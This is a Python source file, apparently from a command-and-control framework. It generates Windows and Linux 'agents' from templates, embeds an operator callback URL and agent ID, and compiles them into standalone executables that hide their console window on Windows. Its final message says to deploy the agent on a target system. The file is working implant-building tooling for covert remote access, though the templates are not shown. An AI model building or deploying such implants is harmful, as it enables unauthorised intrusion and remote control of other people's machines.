#!/usr/bin/env python3
"""
Agent Generator
Generates custom agents for Windows and Linux platforms
"""

import os
import sys
import uuid
import shutil
from datetime import datetime

# Add parent directory to path to import config
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import get_config

class AgentGenerator:
    def __init__(self, operator_url=None):
        # Load configuration
        self.config = get_config()

        # Use provided URL or auto-detect from config
        if operator_url:
            self.operator_url = operator_url
        else:
            # Auto-detect: Try to get from config, otherwise build from server settings
            self.operator_url = self.config.get_server_url()
            # If server is listening on 0.0.0.0, use local IP for agent connection
            if "0.0.0.0" in self.operator_url:
                local_ip = self.config.get_local_ip()
                port = self.config.get("server", "port")
                self.operator_url = f"http://{local_ip}:{port}"

        self.template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'generated_agents')

    def generate_agent(self, platform, output_name=None):
        """Generate an agent for the specified platform"""
        agent_id = str(uuid.uuid4())

        if platform.lower() == 'windows':
            template_file = os.path.join(self.template_dir, 'agent_template_windows.py')
            if not output_name:
                output_name = f"agent_windows_{agent_id[:8]}.py"
        elif platform.lower() == 'linux':
            template_file = os.path.join(self.template_dir, 'agent_template_linux.py')
            if not output_name:
                output_name = f"agent_linux_{agent_id[:8]}.py"
        else:
            raise ValueError(f"Unsupported platform: {platform}")

        # Read template
        with open(template_file, 'r') as f:
            template_content = f.read()

        # Replace placeholders
        agent_content = template_content.replace('{{OPERATOR_URL}}', self.operator_url)
        agent_content = agent_content.replace('{{AGENT_ID}}', agent_id)

        # Write generated agent
        output_path = os.path.join(self.output_dir, output_name)
        os.makedirs(self.output_dir, exist_ok=True)

        with open(output_path, 'w') as f:
            f.write(agent_content)

        # Copy modules directory
        modules_src = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'agent', 'modules')
        modules_dst = os.path.join(self.output_dir, 'modules')

        if os.path.exists(modules_dst):
            shutil.rmtree(modules_dst)
        shutil.copytree(modules_src, modules_dst)

        print(f"[+] Generated {platform} agent: {output_path}")
        print(f"[+] Agent ID: {agent_id}")
        print(f"[+] Operator URL: {self.operator_url}")

        return {
            "agent_id": agent_id,
            "platform": platform,
            "output_path": output_path,
            "generated_at": datetime.now().isoformat()
        }

    def compile_agent(self, agent_path, platform):
        """Compile agent to executable (requires PyInstaller)"""
        try:
            import PyInstaller.__main__

            output_name = os.path.basename(agent_path).replace('.py', '')

            # Build PyInstaller arguments
            pyinstaller_args = [
                agent_path,
                '--onefile',
                '--name', output_name,
                '--distpath', os.path.join(self.output_dir, 'compiled'),
                '--workpath', os.path.join(self.output_dir, 'build'),
                '--specpath', os.path.join(self.output_dir, 'spec')
            ]

            # Add --noconsole only for Windows
            if platform.lower() == 'windows':
                pyinstaller_args.append('--noconsole')

            PyInstaller.__main__.run(pyinstaller_args)

            print(f"[+] Compiled agent: {output_name}")
            return True
        except ImportError:
            print("[!] PyInstaller not installed. Install with: pip install pyinstaller")
            return False
        except Exception as e:
            print(f"[!] Compilation failed: {e}")
            return False

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: python agent_generator.py <platform> [operator_url]")
        print("Platforms: windows, linux")
        print("\nIf operator_url is not provided, it will be auto-detected from:")
        print("  1. Environment variable OPERATOR_URL")
        print("  2. config.json file")
        print("  3. Default: http://localhost:8542")
        sys.exit(1)

    platform = sys.argv[1]
    operator_url = sys.argv[2] if len(sys.argv) > 2 else None

    generator = AgentGenerator(operator_url)
    result = generator.generate_agent(platform)

    print("\n[*] Agent generated successfully!")
    print(f"[*] Deploy this agent on target {platform} system")
